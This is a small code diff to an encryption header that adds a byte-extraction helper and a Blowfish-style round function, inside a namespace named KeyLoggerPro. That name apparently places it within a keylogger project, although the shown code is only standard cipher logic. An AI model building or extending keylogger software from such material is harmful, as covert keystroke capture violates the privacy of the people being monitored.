@@ -2,7 +2,7 @@
  * Encryption.h
  *
  * @author Raul Butuc
- * @version 1.0.0 - 28/07/2016
+ * @version 1.0.1 - 29/07/2016
  */
 
 #pragma once
@@ -45,5 +45,13 @@ namespace KeyLoggerPro {
       void decrypt(const unsigned char*, unsigned char*, size_t, int);
 
   };
+
+  inline unsigned char Byte(unsigned int _ui) {
+    return static_cast<unsigned char>(_ui & 0xFF);
+  }
+
+  inline unsigned int Encryption::F(unsigned int _ui) {
+    return ((m_auiS[0][Byte(_ui>>24)] + m_auiS[1][Byte(_ui>>16)]) ^ m_auiS[2][Byte(_ui >> 8)]) + m_auiS[3][Byte(_ui)];
+  }
 
 }
